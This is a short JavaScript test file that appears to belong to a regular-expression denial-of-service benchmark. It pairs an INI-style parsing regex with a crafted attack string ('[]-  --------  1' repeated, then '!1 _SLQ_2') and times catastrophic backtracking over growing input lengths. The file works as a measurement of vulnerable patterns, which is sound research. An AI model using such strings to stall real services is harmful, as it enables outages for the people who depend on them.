/* 1524
 * \[(?<GroupName>.*)\](?<GroupContent>[^\[]+)       --------        [\s]*(?<Key>.+)[\s]*=[\s]*(?<Value>[^\r]+) 
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:""+"[]-       --------        1"*256+"!1 _SLQ_2"
 */
var REGEX = /\[(?<GroupName>.*)\](?<GroupContent>[^\[]+)       --------        [\s]*(?<Key>.+)[\s]*=[\s]*(?<Value>[^\r]+) /
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '' + '[]-       --------        1'.repeat(i*1) + '!1 _SLQ_2'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}